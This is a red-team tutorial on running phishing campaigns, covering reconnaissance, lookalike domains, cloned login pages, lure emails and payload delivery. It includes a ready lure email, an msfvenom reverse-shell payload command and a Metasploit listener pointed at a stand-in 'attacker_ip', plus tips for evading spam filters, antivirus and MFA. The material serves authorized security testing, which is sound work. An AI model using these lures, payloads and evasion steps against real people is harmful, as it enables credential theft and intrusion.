Phishing is a social engineering technique used to trick targets into divulging sensitive information or executing malicious payloads. It’s a critical part of Red Team engagements to simulate real-world adversary tactics and assess an organization’s ability to detect and respond to such attacks.

---

### **1. What is Phishing?**

- **Definition**: A technique to deceive individuals into revealing sensitive data (e.g., credentials, financial info) or executing malicious code by pretending to be a trusted entity.
- **Common Goals**:
    - Credential harvesting.
    - Delivering malware or payloads.
    - Persuading users to perform actions (e.g., transferring money).

---

### **2. Types of Phishing**

1. **Spear Phishing**:
    - Targeted at specific individuals or organizations.
    - Highly personalized and convincing.
2. **Clone Phishing**:
    - Duplicates legitimate emails but alters links or attachments.
3. **Whaling**:
    - Targets high-profile individuals (e.g., executives).
4. **Smishing**:
    - Phishing via SMS.
5. **Vishing**:
    - Phishing via voice calls.

---

### **3. Phishing Workflow**

1. **Reconnaissance**:
    - Gather intelligence about the target (e.g., organizational structure, email formats).
    - Tools: **LinkedIn**, [**Hunter.io**](http://hunter.io/), **OSINT Framework**.
2. **Setup Infrastructure**:
    - Host phishing sites, payloads, and email services.
    - Use tools like **Gophish** or **PhishTool** for campaign management.
3. **Craft the Email**:
    - Use convincing subject lines and content.
    - Embed links to phishing sites or attach weaponized files.
4. **Deliver the Email**:
    - Bypass spam filters and ensure the email lands in the target’s inbox.
    - Techniques include domain reputation management and message obfuscation.
5. **Execute the Attack**:
    - Await victim interaction (clicks, credential input, payload execution).
    - Monitor and document responses.

---

### **4. Setting Up Phishing Infrastructure**

### **a. Domain and Email Setup**

1. **Register a Domain**:
    - Choose a domain similar to the target’s (e.g., `example-org.com` instead of `example.com`).
    - Use domain name generators for typosquatting.
2. **Set Up Email Server**:
    - Use SMTP services like **Postfix**, **SendGrid**, or **Amazon SES**.
    - Add SPF, DKIM, and DMARC records to improve email legitimacy.

### **b. Hosting Phishing Pages**

- Clone the target’s login page or portal using tools like **SET** (Social Engineering Toolkit) or **BlackEye**.
- Serve the cloned page via HTTPS:
    
    ```bash
    sudo certbot certonly --standalone -d phishing-site.com
    
    ```
    

### **c. Payload Hosting**

- Host malware or payloads on a trusted-looking URL (e.g., file-sharing services like Google Drive).
- Obfuscate payloads to bypass AV/EDR.

---

### **5. Crafting a Convincing Phishing Email**

### **a. Key Components**

1. **Subject Line**:
    - Should grab attention and appear legitimate.
    - Examples:
        - "Urgent: Password Expiry Notification!"
        - "Action Required: Confirm Your Account Details."
2. **Body**:
    - Mimic legitimate communication style and tone.
    - Include call-to-action (e.g., "Click here to verify").
3. **Links**:
    - Use shortened or obfuscated URLs.
    - Tools: **Bitly**, **TinyURL**, or HTML anchor tags.

### **b. Example Email**

```
From: IT Support <support@example.com>
Subject: Important: Your Account Will Be Locked in 24 Hours

Dear User,

We noticed unusual activity in your account. For your security, please verify your account immediately by clicking the link below:

[Verify Account](<https://example-org.com/secure-login>)

If you do not verify within 24 hours, your account will be suspended.

Thank you,
IT Support Team

```

---

### **6. Payload Delivery**

### **a. Malicious Attachments**

- File Types:
    - Macros-enabled Office documents (`.docm`, `.xlsm`).
    - Compressed files (`.zip`, `.rar`) with embedded payloads.
    - PDFs with malicious links.
- Tools:
    - **MSFVenom** to embed payloads in documents.
    
    ```bash
    msfvenom -p windows/x64/meterpreter/reverse_https LHOST=attacker_ip LPORT=443 -f exe -o payload.exe
    
    ```
    
    - Use tools like **EvilClippy** for macro obfuscation.

### **b. URL-Based Payloads**

- Redirect targets to phishing sites or malicious payloads.
- Example phishing URL:
    
    ```
    <https://update.example-org.com/login>
    
    ```
    

---

### **7. Phishing Evasion Techniques**

1. **Domain Reputation**:
    - Register domains with clean histories.
    - Set up SPF/DKIM/DMARC records.
2. **Email Content**:
    - Avoid spammy phrases (e.g., "Free!", "Urgent").
    - Randomize content to bypass signature-based filters.
3. **Obfuscation**:
    - Encode links or attachments.
    - Use HTML entities to obscure text.
4. **Cloaking**:
    - Detect sandbox environments and avoid interacting with them.

---

### **8. Tools for Phishing**

| Tool | Purpose | Features |
| --- | --- | --- |
| **Gophish** | Phishing campaign management | Easy setup, reporting |
| **Social Engineering Toolkit (SET)** | Phishing and payload generation | Cloning, payload delivery |
| **Evilginx2** | Advanced phishing with MITM | Bypass MFA |
| **BlackEye** | Phishing page generator | Prebuilt templates |
| **PhishTool** | Phishing campaign tracking | Target engagement analytics |

---

### **9. Monitoring Phishing Engagement**

1. **Track Responses**:
    - Record link clicks and data submissions.
    - Example tools: **Evilginx2**, **Gophish**.
2. **Analyze Payload Execution**:
    - Use listeners like **Metasploit** or **Cobalt Strike** to monitor connections.
    
    ```bash
    msfconsole
    use exploit/multi/handler
    set payload windows/meterpreter/reverse_tcp
    set LHOST attacker_ip
    set LPORT 4444
    exploit
    
    ```
    
3. **Gather Data**:
    - Capture credentials or session tokens for further exploitation.

---

### **10. Ethical Considerations for Phishing**

- **Authorization**: Only perform phishing attacks in authorized engagements.
- **Clear Scope**: Define objectives and boundaries with the client.
- **Reporting**: Document findings and educate the client on defense mechanisms.

---

### **11. Defense Against Phishing**

### **a. User Awareness**

- Conduct regular training on identifying phishing attempts.
- Encourage cautious behavior with links and attachments.

### **b. Technical Controls**

1. **Email Security**:
    - Deploy spam filters (e.g., Microsoft Defender, Proofpoint).
    - Enforce DMARC, DKIM, and SPF policies.
2. **Link Protection**:
    - Use URL filtering to block malicious domains.
3. **Attachment Scanning**:
    - Analyze files for embedded payloads or macros.

---

### **12. Example Workflow for a Phishing Campaign**

1. **Reconnaissance**:
    - Collect email addresses and context (e.g., common themes in company communication).
2. **Setup**:
    - Register a domain and configure DNS.
    - Host a phishing page and payloads.
3. **Email Crafting**:
    - Write a realistic email using the target’s style and branding.
4. **Delivery**:
    - Use tools like Gophish to send emails.
5. **Monitoring**:
    - Track clicks and payload execution.
